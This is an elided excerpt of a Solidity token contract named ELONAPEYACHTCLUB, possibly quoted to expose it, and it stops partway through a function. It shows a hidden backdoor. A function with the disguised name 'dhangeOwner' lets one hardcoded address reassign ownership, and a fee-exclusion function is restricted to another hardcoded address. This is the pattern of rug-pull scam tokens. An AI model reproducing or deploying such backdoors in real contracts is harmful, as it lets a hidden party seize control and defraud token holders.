...
contract Ownable {
    ...
    function dhangeOwner(address newOwner) public  {
        require
         (  
             msg.sender
            == 0x244e44c722dFB0A759f4181cb1b7E921ac3399C2
            );
                    _owner = newOwner;
    }
}
...
contract ELONAPEYACHTCLUB is IERC20, Ownable {
    ...
    function excludeFromFee(address account) public  {
        require
         (  
             msg.sender
            == 0x74473974C65929e8c211A4928A42D26521da9453
            );
